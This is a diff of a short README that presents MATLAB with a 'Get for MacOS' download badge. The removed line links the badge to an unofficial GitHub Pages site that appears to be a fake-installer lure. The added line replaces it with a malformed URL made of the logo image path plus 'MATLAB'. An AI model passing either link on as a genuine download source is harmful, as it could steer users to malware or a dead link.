@@ -1,14 +1,14 @@
 # MATLAB – Technical Computing Platform
 
 <div align="center">  
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/Matlab_Logo.png/1144px-Matlab_Logo.png" width="250" alt="MATLAB Logo"/>  
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/21/Matlab_Logo.png" width="250" alt="MATLAB Logo"/>  
 </div>  
 
 <br>  
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-applications-install.github.io/.github/MATLAB)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://upload.wikimedia.org/wikipedia/commons/2/21/Matlab_Logo.pngMATLAB)  
 
 </div>  
 
